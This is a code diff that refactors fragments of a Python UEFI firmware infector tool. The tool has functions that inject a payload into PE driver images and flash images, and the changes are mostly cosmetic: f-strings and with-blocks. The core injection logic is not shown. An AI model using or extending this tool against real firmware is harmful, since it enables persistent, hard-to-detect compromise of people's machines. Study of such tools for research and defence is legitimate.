@@ -25,7 +25,7 @@ def _infector_config_offset(pe):
 
             return section.PointerToRawData
 
-    raise(Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION))
+    raise Exception(f'Unable to find {INFECTOR_CONFIG_SECTION} section')
 
 def _infector_config_get(pe, data):
 
@@ -50,10 +50,10 @@ def infect_PE(src, payload, dst = None):
 
     # load payload image
     pe_payload = pefile.PE(payload)
-    
+
     if pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:
 
-        raise(Exception('%s is already infected' % src))
+        raise Exception(f'{src} is already infected')
 
     if pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:
 
@@ -152,59 +152,40 @@ class TEImage:
 
     def __init__(self, name):
 
-        # open input file
-        fd = open(name, 'rb')
+        with open(name, 'rb') as fd:
+            self.offset = fd.tell()
 
-        self.offset = fd.tell()
+            # read header
+            self.signature, self.machine, self.num_sections, self.subsystem, \
+                self.stripped_size, self.entry_point_addr, self.code_base, \
+                self.image_base = unpack(self.TE_HEADER, fd.read(24))
 
-        # read header
-        self.signature, self.machine, self.num_sections, self.subsystem, \
-        self.stripped_size, self.entry_point_addr, self.code_base, \
-        self.image_base = unpack(self.TE_HEADER, fd.read(24))
+            # read data directory
+            addr_1, size_1, addr_2, size_2 = unpack(self.TE_DATA_DIR, fd.read(16))
 
-        # read data directory
-        addr_1, size_1, addr_2, size_2 = unpack(self.TE_DATA_DIR, fd.read(16))
+            self.data_dir = [(addr_1, size_1), (addr_2, size_2)]
+            self.sections = []
 
-        self.data_dir = [(addr_1, size_1), (addr_2, size_2)]
-        self.sections = []
+                # read section table
+            self.sections.extend(TEImageSection(fd) for _ in range(0, self.num_sections))
+            # read section data
+            for section in self.sections:
 
-        # read section table
-        for i in range(0, self.num_sections):
+                last_section = section
+                section.data = fd.read(section.data_size)
 
-            self.sections.append(TEImageSection(fd))
+                assert len(section.data) == section.data_size
 
-        # read section data
-        for section in self.sections:
-
-            last_section = section
-            section.data = fd.read(section.data_size)
-
-            assert len(section.data) == section.data_size
-
-        last_section.data += fd.read()
-
-        # close input file
-        fd.close()    
+            last_section.data += fd.read()    
 
     def write(self, name = None):
 
-        ret = None
-
-        if name is None:
-
-            # write data to memory buffer
-            fd = StringIO.StringIO()
-
-        else:
-
-            # open input file
-            fd = open(name, 'wb')
-
+        fd = StringIO.StringIO() if name is None else open(name, 'wb')
         # write header
         fd.write(pack(self.TE_HEADER, \
-                      self.signature, self.machine, self.num_sections, \
-                      self.subsystem, self.stripped_size, self.entry_point_addr, \
-                      self.code_base, self.image_base))
+                          self.signature, self.machine, self.num_sections, \
+                          self.subsystem, self.stripped_size, self.entry_point_addr, \
+                          self.code_base, self.image_base))
 
         addr_1, size_1 = self.data_dir[0]
         addr_2, size_2 = self.data_dir[1]
@@ -221,11 +202,8 @@ class TEImage:
         for section in self.sections:
 
             fd.write(section.data)
-            
-        if name is None:
 
-            ret = fd.getvalue()
-
+        ret = fd.getvalue() if name is None else None
         # close input file
         fd.close()  
 
@@ -306,7 +284,7 @@ def disasm(data):
 
     for insn in cs.disasm(data, len(data)):
 
-        return insn.mnemonic + ' ' + insn.op_str, insn.size
+        return f'{insn.mnemonic} {insn.op_str}', insn.size
 
 def infect_flash(src, payload, dst = None, patch_offs = None):
 
@@ -515,20 +493,20 @@ def main():
             print('[!] --payload must be specified')
             return -1
 
-        print('[+] Target image: ' + options.driver_image)
-        print('[+] Payload: ' + options.payload)
+        print(f'[+] Target image: {options.driver_image}')
+        print(f'[+] Payload: {options.payload}')
 
         if options.output is None:
 
-            backup = options.driver_image + '.bak'
+            backup = f'{options.driver_image}.bak'
             options.output = options.driver_image
 
-            print('[+] Backup: ' + backup)
+            print(f'[+] Backup: {backup}')
 
             # backup original file
             shutil.copyfile(options.driver_image, backup)
 
-        print('[+] Output file: ' + options.output)
+        print(f'[+] Output file: {options.output}')
 
         # get image signature
         with open(options.driver_image, 'rb') as fd:
@@ -559,20 +537,20 @@ def main():
             print('[!] --payload must be specified')
             return -1
 
-        print('[+] Target image: ' + options.flash_image)
-        print('[+] Payload: ' + options.payload)
+        print(f'[+] Target image: {options.flash_image}')
+        print(f'[+] Payload: {options.payload}')
 
         if options.output is None:
 
-            backup = options.flash_image + '.bak'
+            backup = f'{options.flash_image}.bak'
             options.output = options.flash_image
 
-            print('[+] Backup: ' + backup)
+            print(f'[+] Backup: {backup}')
 
             # backup original file
             shutil.copyfile(options.flash_image, backup)
 
-        print('[+] Output file: ' + options.output)
+        print(f'[+] Output file: {options.output}')
 
         # infect UEFI firmware image
         infect_flash(options.flash_image, options.payload, \
